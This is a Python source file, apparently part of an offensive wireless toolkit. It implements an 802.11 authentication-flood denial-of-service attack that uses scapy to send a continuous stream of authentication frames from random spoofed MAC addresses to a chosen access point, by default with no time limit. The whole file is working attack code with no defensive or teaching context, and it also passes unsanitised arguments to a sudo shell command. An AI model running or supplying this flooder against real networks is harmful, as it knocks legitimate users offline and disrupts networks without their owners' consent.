# core/WIFI/auth_dos.py
import os
import random
import time

from scapy.all import RadioTap, Dot11, Dot11Auth, sendp
from debugs import debug


def auth_dos(interface, target_bssid, channel, pps=10000, duration=0):
    duration_label = 'infinite' if duration <= 0 else f'{duration}s'
    debug("info", f"[*] Authentication DoS Attack")
    debug("info", f"[*] Target: {target_bssid} | Channel: {channel}")
    debug("info", f"[*] Speed: {pps} pps | Duration: {duration_label}")

    os.system(f"sudo iw dev {interface} set channel {channel}")
    time.sleep(0.5)

    debug("info", "[*] Flooding with authentication requests...")

    sent = 0
    start_time = time.time()

    try:
        while duration <= 0 or time.time() - start_time < duration:
            client_mac = "02:%02x:%02x:%02x:%02x:%02x" % (
                random.randint(0, 255), random.randint(0, 255),
                random.randint(0, 255), random.randint(0, 255),
                random.randint(0, 255)
            )

            packet = RadioTap() / Dot11(
                type=0,
                subtype=11,
                addr1=target_bssid,
                addr2=client_mac,
                addr3=target_bssid,
            ) / Dot11Auth(
                algo=0,
                seqnum=1,
                status=0,
            )

            sendp(packet, iface=interface, count=100, inter=0, verbose=0)
            sent += 100

            if sent % 10000 == 0:
                elapsed = time.time() - start_time
                rate = sent / elapsed if elapsed > 0 else 0
                debug("info", f"[*] Sent: {sent} ({rate:.0f} pps)")

        if duration > 0:
            elapsed = time.time() - start_time
            debug("ok", f"[+] Attack complete! Sent {sent} packets in {elapsed:.1f}s")

    except KeyboardInterrupt:
        debug("info", f"\n[!] Stopped. Sent {sent} packets")
